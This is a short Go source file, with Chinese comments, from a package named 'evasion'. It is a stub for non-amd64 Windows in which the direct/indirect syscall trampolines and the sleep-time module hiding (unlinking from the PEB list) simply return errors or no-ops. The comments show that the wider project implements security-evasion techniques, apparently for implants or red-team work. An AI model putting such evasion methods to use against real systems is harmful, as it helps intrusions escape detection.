//go:build windows && !amd64

// 非 amd64 Windows 平台：无 trampoline 支持（x86/arm64 机器码不同），
// syscall 模式回退为常规 ntdll 调用。
package evasion

import "errors"

// PrepareTrampolines 非 amd64 平台不支持 direct/indirect syscall。
func PrepareTrampolines(mode string) error {
	return errors.New("当前架构不支持 direct/indirect syscall（仅 amd64）")
}

// HasTrampoline 非 amd64 平台永远没有 trampoline（调用方据此回退宿主 API）。
func HasTrampoline(name string) bool { return false }

// Syscall 非 amd64 平台不可用（返回错误，调用方回退常规 ntdll 路径）。
func Syscall(name string, args ...uintptr) (uintptr, error) {
	return 0, errors.New("当前架构不支持 direct/indirect syscall（仅 amd64）")
}

// HideForSleep 非 amd64 的 Windows 不实现模块摘链（PEB 链表布局按 x64 写的）。
func HideForSleep(enabled bool) func() { return func() {} }
